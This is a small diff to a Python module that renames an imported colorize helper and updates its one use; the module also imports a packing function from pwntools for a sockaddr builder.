@@ -5,7 +5,7 @@ from __future__ import annotations
 from dataclasses import dataclass, field
 from typing import Dict, Iterable, Optional, Tuple, Union, Literal
 from pwn import pack  # kept for sockaddr builder
-from .utils import _colorize
+from .utils import colorize
 import ipaddress
 
 __all__ = [
@@ -19,7 +19,7 @@ __all__ = [
     "build_sockaddr_in",
 ]
 
-COL = _colorize()
+COL = colorize()
 
 # CORE TYPES
 # --------------------------------------------------------------------------------------
